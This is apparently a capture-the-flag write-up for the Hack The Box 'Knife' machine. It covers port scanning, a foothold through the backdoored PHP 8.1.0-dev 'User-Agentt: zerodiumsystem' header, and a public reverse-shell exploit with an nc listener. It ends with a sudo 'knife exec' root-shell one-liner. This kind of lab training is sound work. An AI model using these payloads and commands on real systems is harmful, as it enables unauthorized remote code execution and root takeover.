# Knife — Easy — Linux

**Date:** 9 June 2026

---

## Tags
`#linux` `#web` `#php-backdoor` `#privesc-sudo` `#gtfobins`

---

## What I Know

| Item            | Detail                                        |
| --------------- | --------------------------------------------- |
| Target          | knife.htb (10.129.13.102)                     |
| OS              | Linux (Ubuntu)                                |
| Open ports      | 22 (SSH), 80 (HTTP)                            |
| Services        | OpenSSH 8.2p1; Apache httpd 2.4.41            |
| Web tech        | PHP 8.1.0-dev (backdoored RCE)              |
| Initial user    | james                                         |
| Privesc vector  | `knife` command via sudo (NOPASSWD)           |

---

## Recon Notes

### Nmap Results

```
nmap -p- --min-rate 3000 -T4 10.129.13.102 -oA Knife_Scan_Initial

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 17:27 +0100
Nmap scan report for knife.htb (10.129.13.102)
Host is up (0.051s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

<img width="913" height="312" alt="image" src="https://github.com/user-attachments/assets/557fe6e5-9de9-475f-b8b5-1b269af3d6f2" />

```
nmap -sC -sV -Pn 10.129.13.102 -p22,80 -oA Knife_Scan_Detailed

Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 17:29 +0100
Nmap scan report for knife.htb (10.129.13.102)
Host is up (0.015s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.26 seconds
```

<img width="1202" height="437" alt="image" src="https://github.com/user-attachments/assets/68aa177d-f2e0-435e-aa23-876b7af07a17" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 8.2p1 on Ubuntu. Open, but I have no credentials yet, so this is a target to come back to once I find some.
- **Port 80 (HTTP)** — Apache 2.4.41 serving a web application. This is my entry point, so I'll focus here first.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT: Investigate the next port (port 80)
```

```
OBSERVATION: Port 80 is open
WHAT IT TELLS ME: The server is hosting a web application
WHAT I AM GOING TO TRY: Navigate to the application and investigate it
WHY: To understand what the application does
RESULT: It looks like a single-page application with nothing obviously interesting
WHAT NEXT:
- Try directory fuzzing to find hidden directories
- Check for any interesting JavaScript in the page
- Check the page source
- Investigate the tech stack in use
- Inspect the HTTP response headers
```

<img width="2563" height="858" alt="image" src="https://github.com/user-attachments/assets/d8ae3657-2f99-4d2f-811f-89f84747f3fe" />

<img width="1782" height="768" alt="image" src="https://github.com/user-attachments/assets/f6f6ad95-91b4-4644-a88e-06262aaf86e5" />

<img width="512" height="568" alt="image" src="https://github.com/user-attachments/assets/e484e22b-1bcf-4e21-8df3-84e934783701" />

<img width="636" height="402" alt="image" src="https://github.com/user-attachments/assets/697aa62c-091c-4235-a9d8-0cf8a2a9c678" />


```
OBSERVATION:
- No interesting directories were found
- Nothing interesting in the page JavaScript
- Nothing interesting in the page source
- Wappalyzer shows that the application uses php 8.1.0, a a quick search shows that php 8.1.0-dev is vulnerable to RCE
- Inspecting the HTTP response headers revealed the tech stack: the server is running PHP 8.1.0-dev
WHAT IT TELLS ME: I can exploit the backdoor in PHP 8.1.0-dev to get RCE
WHAT I AM GOING TO TRY: Use the public exploit at https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py to get a reverse shell
WHY: It is a known, reliable vulnerability for this exact build
RESULT: Got a reverse shell
WHAT NEXT: Identify the current user and locate user.txt
```

<img width="1042" height="102" alt="image" src="https://github.com/user-attachments/assets/cab61e1b-2997-4e52-b1dc-1f8c53e9aa24" />

<img width="1039" height="229" alt="image" src="https://github.com/user-attachments/assets/8b3c8892-6e95-47b9-b626-12152da8f5e3" />

<img width="2505" height="1240" alt="image" src="https://github.com/user-attachments/assets/1d97e164-dc93-4762-b185-83b97ff2d885" />

```
OBSERVATION: Landed a shell as james and read user.txt
WHAT IT TELLS ME: I am james, the only standard user on the box; I now need to escalate to root
WHAT I AM GOING TO TRY: Enumerate the foothold for a privilege-escalation vector
WHAT NEXT: Enumerate the system 
```

<img width="1197" height="602" alt="image" src="https://github.com/user-attachments/assets/f886d794-110a-4ec3-a30f-0cc33c5d00b1" />

```
OBSERVATION: sudo -l shows james may run the knife command as root without a password
WHAT IT TELLS ME: knife (a Chef utility) can execute Ruby, so I can abuse it via GTFOBins to run commands as root
WHAT I AM GOING TO TRY: Use the GTFOBins knife entry to spawn a root shell
RESULT: Got a root shell by abusing knife and read root.txt
```

<img width="1069" height="730" alt="image" src="https://github.com/user-attachments/assets/b29dfd76-c456-41b4-9c7e-83ba8f5e8e28" />

<img width="1029" height="397" alt="image" src="https://github.com/user-attachments/assets/f9acb61d-19e1-4fae-8e8f-0e8fa00a98cc" />

<img width="695" height="127" alt="image" src="https://github.com/user-attachments/assets/4658b7e7-e6ae-45c2-aacc-b74f6ac1e81f" />

---

## Foothold

**How I got in:** The web server was running PHP **8.1.0-dev**, a build that was briefly published to the official source with a planted backdoor. It honours a magic HTTP header (`User-Agentt: zerodiumsystem("<cmd>")`) and executes whatever command follows, giving unauthenticated remote code execution. I identified the version from the HTTP response headers, then used the public exploit to land a reverse shell as james.

**Command / exploit used:**
```
git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce
python3 revshell_php_8.1.0-dev.py http://10.129.13.102/ <LHOST> <LPORT>
# with a listener ready: nc -lnvp <LPORT>   → shell as james
```

**Why it worked:** Reading the response headers gave me the exact PHP version. Matching `8.1.0-dev` to the known backdoor told me the server would execute commands sent in the crafted `User-Agentt` header. No authentication was required the backdoor is reachable by anyone who can hit port 80.

---

## Privilege Escalation

**Path taken (james → root):** Running `sudo -l` revealed james could run `/usr/bin/knife` as root with `NOPASSWD`. `knife` is the Chef command-line tool, and its `exec` subcommand runs arbitrary Ruby. Following the GTFOBins entry, I had knife execute Ruby that spawns a shell and because sudo runs it as root, that returned a root shell. I then read `/root/root.txt`.

```
sudo knife exec -E 'exec "/bin/sh"'
# id → uid=0(root) gid=0(root) groups=0(root)
```

**Why it worked:** The sudo rule allowed a program that can execute arbitrary code (a scripting/automation tool) to run as root with no password. Any binary that can run code or escape to a shell becomes a privilege-escalation primitive once it's permitted through sudo — exactly the class of misconfiguration GTFOBins catalogues.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Fingerprinted the server as the backdoored PHP 8.1.0-dev build from its response headers and used the `User-Agentt` magic-header exploit for unauthenticated RCE as james.
2. **Privesc technique in one sentence:** Abused a `NOPASSWD` sudo rule on the `knife` Chef tool to execute Ruby as root (per GTFOBins) and spawn a root shell.
